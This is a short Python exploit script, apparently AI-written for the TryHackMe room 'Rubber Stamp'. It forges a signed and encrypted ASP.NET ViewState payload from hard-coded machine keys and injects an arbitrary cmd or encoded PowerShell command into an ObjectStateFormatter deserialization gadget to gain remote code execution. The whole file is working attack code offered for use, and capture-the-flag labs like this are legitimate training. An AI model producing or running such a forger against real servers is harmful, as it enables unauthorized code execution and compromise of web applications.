# script by DeepSeek v4.1 Flash free
#script for TryHckMe room Rubber Stamp

import sys, base64, hmac, hashlib, os
sys.path.insert(0, 'bsmin')
from badsecrets.helpers import sp800_108_derivekey, sp800_108_get_key_derivation_parameters
from Crypto.Cipher import AES

VKEY = bytes.fromhex("D7D2FA8B5C1E4A9F3B6C8D0E2F4A6B8C1D3E5F7A9B1C3D5E7F9A1B3C5D7E9F1A")
EKEY = bytes.fromhex("A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4")
lbl, ctx = sp800_108_get_key_derivation_parameters("WebForms.HiddenFieldPageStatePersister.ClientState",
    ["TemplateSourceDirectory: /LEGACY", "Type: LEGACY_REQUESTSTATUS_ASPX"])
dekey = sp800_108_derivekey(EKEY, lbl, ctx, len(EKEY)*8)
dvkey = sp800_108_derivekey(VKEY, lbl, ctx, len(VKEY)*8)

def vlq(n):
    out=bytearray()
    while n>=0x80:
        out.append((n&0x7f)|0x80); n>>=7
    out.append(n&0x7f); return bytes(out)

args = sys.argv[1:]
if args[0] == '-ps':
    script = args[1]
    enc = base64.b64encode(script.encode('utf-16le')).decode()
    cmd = 'powershell -NoP -NonI -enc ' + enc
elif args[0] == '-cmd':
    cmd = args[1]
else:
    cmd = args[0]

payload = bytearray(base64.b64decode(open('unsigned.txt').read().strip()))

# Locate the embedded "/c <command>" string in the ObjectStateFormatter payload.
i = payload.find(b"/c ")
if i < 1:
    raise SystemExit("could not find embedded /c command in unsigned.txt")
# The byte immediately before "/c " is the 7-bit VLQ string length.
old_len = payload[i - 1]
if old_len & 0x80:
    raise SystemExit("unexpected multi-byte VLQ length for old command")
newseq = vlq(len(cmd) + 3) + b"/c " + cmd.encode()
payload[i - 1 : i + old_len] = newseq
data_start = 3 + len(vlq(len(payload)-3))
enc_len = vlq(len(payload)-data_start)
if 3+len(enc_len) != data_start:
    raise SystemExit("vlq size drift")
payload[3:3+len(enc_len)] = enc_len
pt = bytes(payload); padlen = 16-(len(pt)%16); pt += bytes([padlen])*padlen
iv = os.urandom(16); ct = AES.new(dekey, AES.MODE_CBC, iv).encrypt(pt)
blob = iv+ct; sig = hmac.new(dvkey, blob, hashlib.sha1).digest()
open('forged_vs.b64','w').write(base64.b64encode(blob+sig).decode())
